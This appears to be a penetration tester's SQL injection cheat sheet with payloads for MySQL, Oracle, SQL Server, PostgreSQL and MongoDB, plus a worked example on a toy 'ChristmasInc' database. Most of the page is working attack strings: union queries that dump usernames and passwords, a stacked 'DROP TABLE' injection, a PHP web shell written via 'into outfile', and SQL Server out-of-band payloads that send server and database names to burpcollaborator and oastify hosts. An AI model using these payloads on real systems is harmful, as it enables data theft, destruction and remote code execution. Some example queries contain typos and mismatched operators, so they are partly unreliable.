# SQL Injection

[HOME](../index.html) / [Web](./)

## The basics

How an example of unsecure sql statement looks like:

```
$SQL = "SELECT * FROM {tablename} WHERE {username} = ' + $_POST["username"] + ' AND ' + $_POST['password']'";
```

To break the statement:

```
$SQL = "SELECT * FROM {tablename} WHERE {username} = ' + 1' OR 1+1-- + ' AND ' + $_POST['password']'";
```

Order by:

{% code overflow="wrap" %}
```sql
=1 order by 1
=1 order by 2
=1 order by 3
.
.
.
Until error occurs, then:
=1 union all select 1, 2, 3...
=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
=1 union all select 1, username, password from users
santaa_clauz" UNION ALL SELECT 1,2,3,4,@@version#

' union select 1,2,3,concat(schema_name, ':') from information_schema.schemata-- -    # db name
' union select 1,2,3,concat(table_name, ':') from information_schema.tables where table_schema = '[DB_NAME]'-- -   # table name
' union select 1,2,3,concat(column_name, ':') from information_schema.columns where table_name = '[TABLE_NAME]'-- -   # column name
' union select 1,2,3,concat(id, ':', name, ':', email, ':', password) from user-- -   # column content
order by (CASE WHEN (SELECT (SUBSTRING(flag,1,1)) from flag) = 'a' then title else date end) ASC

SELECT COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME = "[TABLE_NAME]" AND COLUMN_NAME = "[COLUMN_NAME]";
" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#
```
{% endcode %}

### Simple SQL injection test

```
'
1' OR 1+1--
\'
```

### Stacked injection; Where table name is known

```
1'; DROP TABLE {tablename} --
```

### Where column name is known

```
1'; ALTER TABLE {tablename} ALTER COLUMN {columnname} {datatype} --
1' UNION SELECT {columnname} FROM {tablename};--
1' UNION ALL SELECT {columnname} FROM {tablename};--
```

## Blind injection

Apply in URL

```
www.example.com/xxx.php?id=1 or 1=1
```

## RCE with UNION

```
123' UNION SELECT '<?php echo system("ls -la /");?>','2','3','4','5' into outfile '/var/www/html/shell.php'#
```

## Oracle DB

```
' UNION SELECT table_name,null,null FROM all_tables--
' UNION SELECT  column_name,null,null FROM all_tab_columns WHERE table_name=''--
' UNION SELECT [col1],[col2],null FROM [table]--
' AND (SELECT COUNT(global_name) FROM global_name)=19 AND 'AdhT'='AdhT    # number of rows
' AND (SELECT LENGTH(global_name) FROM global_name)=8 AND 'AdhT'='AdhT    # word count
' AND SUBSTRC((SELECT global_name FROM global_name),1,1)=65 AND 'AdhT'='AdhT    # Ascii decode
```

## Microsoft SQL Server

```
--------------------Union-Based----------------------
' OR LEN(CURRENT_USER)='3
' OR SUBSTRING(CURRENT_USER,1,3)='DBO
' OR LEN(db_name())=13;--
' OR SUBSTRING(db_name(),1,5)='xxxxx';--

-------------------Boolean-Based---------------------
allllbc' OR LEN(CURRENT_USER)=3;--
allllcs' OR SUBSTRING(CURRENT_USER,1,3)='DBO';--

--------------------Error-Based----------------------
'*cast((SELECT @@version) as int)*'        
' and 1=convert(int,@@version)-- -
' and 1=convert(int,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'))-- -
' and 1=convert(int,(select top 1 table_name from information_schema.tables))--
' and 1=convert(int,(select top 1 name from sys.databases))--
' and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in ('xxxxx')))--
' and 1=convert(int,(select top 1 name from sys.databases where name not in ('master','tempdb')))--

---------------------Time-Based---------------------
' if(len(current_user)=3 waitfor delay'0:0:20'--
'IF CURRENT_USER='dbo' WAITFOR DELAY '00:00:15'--
'IF((SELECT count(db_name()))=1) WAITFOR DELAY '00:00:5'--
'IF((SELECT count(database_id) from sys.databases)=1) WAITFOR DELAY '00:00:5'--
'IF((SELECT count(database_id) from sys.databases)=1) WAITFOR DELAY '00:00:5'--

---------------------OOB---------------------
';declare @q varchar(200);set @q='\Wjrxfk8l48mhb5kh7d4s2v8zoquji8.'+(SELECT SUBSTRING(@@servername,1,9))+'.burpcollaborator.net\jje'; exec master.dbo.xp_dirtree @q;-- 
';declare @q varchar(200);set @q='\Wjrxfk8l48mhb5kh7d4s2v8zoquji8.'+(SELECT SUBSTRING(@@version,1,9))+'.burpcollaborator.net\jje'; exec master.dbo.xp_dirtree @q;-- 
';declare @q varchar(200);set @q='\Wjrxfk8l48mhb5kh7d4s2v8zoquji8.'+(SELECT SUBSTRING(DB_NAME(1),1,9))+'.burpcollaborator.net\jje'; exec master.dbo.xp_dirtree @q;-- 
';declare @q varchar(200);set @q='\Wjrxfk8l48mhb5kh7d4s2v8zoquji8.'+(SELECT SUBSTRING(USER_NAME(1),1,9))+'.burpcollaborator.net\jje'; exec master.dbo.xp_dirtree @q;-- 
');declare @q varchar(200);set @q='\\fj2meelkqbazaz61dntl0yzycpih69uy.'+(SELECT SUBSTRING(@@version,1,9))+'.oasti'+'fy.com\huh'; exec master.dbo.xp_dirtree @q;--
```

***

**Sample Database**

```
Database name: ChristmasInc
Database table: employee

SELECT * FROM employee;

+--------------+------------------------+---------------------------+----------------+
| emp_id (int) | emp_name (varchar(30)) | emp_position (varchar(10))| emp_dob (date) |
+--------------+------------------------+---------------------------+----------------+
| 1            | Ann                    | IT                        |  09-06-1998    |
+--------------+------------------------+---------------------------+----------------+
| 2            | Santa Claus            | CEO                       |  24-12-1978    |
+--------------+------------------------+---------------------------+----------------+
| 3            | Mr Reindeer            | HR                        |  16-03-1968    |
+--------------+------------------------+---------------------------+----------------+
| 4            | Snow Man               | Admin                     |  01-02-1982    |
+--------------+------------------------+---------------------------+----------------+
```

**Vulnerable SQL Statement**

```
sqlquery = "SELECT * FROM employee WHEN emp_name LIKE '%" + userinput + "%' ORDERY BY emp_id;"
userinput = "an"

# complete query
# SELECT * FROM employee WHERE emp_name LIKE '%an%' ORDER BY emp_id;

+--------+-------------+--------------+-------------+
| emp_id | emp_name    | emp_position | emp_dob     |
+--------+-------------+--------------+-------------+
| 1      | Ann         | IT           |  09-06-1998 |
+--------+-------------+--------------+-------------+
| 2      | Santa Claus | CEO          |  24-12-1978 |
+--------+-------------+--------------+-------------+
| 4      | Snow Man    | Admin        |  01-02-1982 |
+--------+-------------+--------------+-------------+
```

#### Boolean-based Blind SQLi

When a true or false condition is present, result will be shown when a true statement is returned. To extract information in a boolean-based blind SQLi, use the LEN() and SUBSTRING() function.

> LEN() returns the number of characters of the specified string expression, excluding trailing spaces.

> SUBSTRING() returns part of a character, binary, text, or image expression in SQL Server.

**Example**

Use the LEN() function to find how many character the database name present:

```
userinput = "' OR LEN(db_name())=1;--"
# returns false, no data is retrieved:
SELECT * FROM employee WHERE emp_name LIKE '%' AND LEN(db_name())=1;--%' ORDER BY emp_id;

userinput = "' OR LEN(db_name())=2;--"
# returns false, no data is retrieved:
SELECT * FROM employee WHERE emp_name LIKE '%' AND LEN(db_name())=2;--%' ORDER BY emp_id;

...

userinput = "' OR LEN(db_name())=12;--"
# returns true, data is returned:
SELECT * FROM employee WHERE emp_name LIKE '%' AND LEN(db_name())=12;--%' ORDER BY emp_id;
```

Use the SUBSTRING() function to find each character of the database name:

```
# check if the first letter of the database name is A:
userinput = "' AND SUBSTRING(db_name(),1,1)='A';--"
# returns FALSE, no data is retrieved:
SELECT * FROM employee WHERE emp_name LIKE '%' AND SUBSTRING(db_name(),1,1)='A';--%' ORDER BY emp_id;

# check if the first letter of the database name is B:
userinput = "' AND SUBSTRING(db_name(),1,1)='B';--"
# returns FALSE, no data is retrieved:
SELECT * FROM employee WHERE emp_name LIKE '%' AND SUBSTRING(db_name(),1,1)='B';--%' ORDER BY emp_id;

# check if the first letter of the database name is C:
userinput = "' AND SUBSTRING(db_name(),1,1)='C';--"
# returns TRUE, data is returned:
SELECT * FROM employee WHERE emp_name LIKE '%' AND SUBSTRING(db_name(),1,1)='C';--%' ORDER BY emp_id;

...

# check if the 5th letter of the database name is s:
userinput = "' AND SUBSTRING(db_name(),1,5)='Chris';--"
# returns TRUE, data is returned:
SELECT * FROM employee WHERE emp_name LIKE '%' AND SUBSTRING(db_name(),1,5)='Chris';--%' ORDER BY emp_id;

...

# check if the 12th letter of the database name is c:
userinput = "' AND SUBSTRING(db_name(),1,12)='ChristmasInc';--"
# returns TRUE, data is returned:
SELECT * FROM employee WHERE emp_name LIKE '%' AND SUBSTRING(db_name(),1,12)='ChristmasInc';--%' ORDER BY emp_id;
```

***

#### Error-based SQLi

When a misconfigured database outputs SQL error message to the user, an error-based SQLi is possible. The malicious user may insert a payload to trigger an intentional error to grab the desired output.

**Example**

Attempting to convert a VARCHAR value into INT will trigger a SQL Error:

```
userinput = "' AND 1=CONVERT(INT,@@version);--"
# complete query
SELECT * FROM employee WHERE emp_name LIKE '%' AND 1=CONVERT(INT,@@version);--%' ORDER BY emp_id;
```

Error message with the desired output:

<figure><img src="https://cdn-images-1.medium.com/max/1000/1*K--cEzSuukmkyOuURzVt7g.png" alt=""><figcaption></figcaption></figure>

***

#### Union-based SQLi

Union-based SQLi can be used to retrieve data from other table by extending the original SQL query.&#x20;

There are a few conditions to be met for a union query to work:&#x20;

Firstly, a union query require the same number of column on both side. Therefore, in order to perform a union-based SQLi, we first need to find the number of columns used in the syntax.&#x20;

Secondly, the columns on both side must have the same data type.

**Condition 1 (Number of columns)**

Number of columns for the first table and the second must be the same:

```
# Number of columns on both side are different, statement invalid:
SELECT column1, column2, column3 FROM table1 UNION ALL SELECT columnX FROM table2;

# Number of columns on both side are different, statement invalid:
SELECT column1, column2, column3 FROM table1 UNION ALL SELECT columnX, columnY FROM table2;

# Number of columns on both side matches, statement is valid:
SELECT column1, column2, column3 FROM table1 UNION ALL SELECT columnX, columnY, columnZ FROM table2;
```

**Condition 2 (Same data type)**

The data type of each relative column must be the same:

```
# Data type of columns1 and columnX is different, statement invalid:
SELECT column1(int) FROM table1 UNION ALL SELECT columnX(date) FROM table2;

# Data type of columns3 and columnZ is different, statement invalid:
SELECT column1(int), column2(date), column3(varchar) FROM table1 UNION ALL SELECT columnX(int), columnY(date), columnZ(blob) FROM table2;

# Data type of all columns from table1 and table 2 are the same , statement is valid:
SELECT column1(int), column2(date), column3(varchar) FROM table1 UNION ALL SELECT columnX(int), columnY(date), columnZ(varchar) FROM table2;
```

#### Time-based Blind SQLi

> A time-based blind SQL injection attack is a type of attack in which the attacker sends a malicious SQL query to a database and measures the time it takes for the database to respond. By repeatedly sending these types of queries and measuring the response times, the attacker can infer information about the database, such as the names of tables or fields, or even the data stored in those tables. This technique can be used to extract sensitive data from the database or to modify the data in the database.

## PostgreSQL

```
-------------------Boolean-Based---------------------
' or substr(current_database(),1,3) = 'tes
' or substr(version(),1,10) = 'PostgreSQL
' and substr(current_schema(),1,6) = 'public
' or (SELECT substr(datname,1,1) FROM pg_database LIMIT 1)='p     #database name
' AND ASCII(SUBSTRING((SELECT tablename FROM pg_tables WHERE schemaname=public) ORDER BY tablename OFFSET 2 LIMIT 1)::text FROM 2 FOR 1)>90--
' or (SELECT substr(tablename,1,1) FROM pg_tables WHERE schemaname='public' LIMIT 1 OFFSET 1)='p    #table name
' or (SELECT substr(column_name,1,1) FROM information_schema.columns WHERE table_name='[table_name]' LIMIT 1 OFFSET 1)='p    #column name
' or (SELECT substr([column_name],1,1) FROM [table_name] LIMIT 1 OFFSET 1)='p    #data
---------------------Time-Based---------------------
';SELECT PG_SLEEP(5)--
' AND 6826=(SELECT 6826 FROM PG_SLEEP(5))--
```

## NodeJS / MongoDB

```
POST /login HTTP/1.1
Host: 10.10.11.139:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 43
Origin: http://10.10.11.139:5000
Connection: close
Referer: http://10.10.11.139:5000/login
Upgrade-Insecure-Requests: 1

{"user":"admin","password":{"$regex":"^A"}}    # bruteforce password start with A
```
